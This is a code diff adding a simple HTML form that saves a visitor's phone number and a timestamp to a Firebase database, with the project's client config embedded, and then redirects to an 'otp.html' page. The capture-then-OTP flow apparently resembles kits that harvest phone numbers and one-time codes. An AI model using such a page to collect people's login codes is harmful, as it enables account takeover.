@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Phone Number Form</title>
+</head>
+
+<body>
+    <form action="" method="POST" id="phoneform">
+        <h1>Enter Your Phone Number</h1>
+        <div class="alert">Form Submitted Successfully</div>
+
+        <!-- Phone Number Section -->
+        <fieldset>
+            <legend><span class="section">1</span>Your Phone Number</legend>
+            <label class="" for="phone">Phone Number:</label>
+            <input type="tel" name="phone" value="" id="phone" required />
+        </fieldset>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5NSPezPZvo5W1286s87bb10SNMzU7Mpg",
+            authDomain: "testbot1-1-28016.firebaseapp.com",
+            projectId: "testbot1-1-28016",
+            storageBucket: "testbot1-1-28016.firebasestorage.app",
+            messagingSenderId: "856851214086",
+            appId: "1:856851214086:web:5cdfa3711eb8d2a4267887",
+            measurementId: "G-8MHHCVFLMD"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+
+        // Listen for submit event
+        document.getElementById('phoneform').addEventListener('submit', formSubmit);
+
+        // Submit form
+        function formSubmit(e) {
+            e.preventDefault();
+            // Get phone number from DOM
+            let phone = document.querySelector('#phone').value;
+            const phoneKey = Math.floor(Math.random() * 10000000).toString();
+
+            // Get the current timestamp
+            const timestamp = new Date().toISOString();
+
+            // Send phone number and timestamp to Firebase
+            sendPhoneNumber(phone, phoneKey, timestamp);
+        }
+
+        // Send phone number and timestamp to Firebase
+        function sendPhoneNumber(phone, phoneKey, timestamp) {
+            const database = getDatabase();
+
+            set(ref(database, 'phones/' + phoneKey), {
+                phone: phone,
+                timestamp: timestamp // Store the current time
+            }).then(() => {
+                // Store the phoneKey in localStorage
+                localStorage.setItem('phoneKey', phoneKey);
+
+                // Show alert message
+                document.querySelector('.alert').style.display = 'block';
+                // Hide alert message after 7 seconds
+                setTimeout(function () {
+                    document.querySelector('.alert').style.display = 'none';
+                }, 7000);
+                // Redirect to otp.html
+                setTimeout(function () {
+                    window.location.href = "otp.html";
+                }, 2000);
+                document.getElementById('phoneform').reset();
+            }).catch((error) => {
+                alert(error);
+            });
+        }
+    </script>
+</body>
+</html>
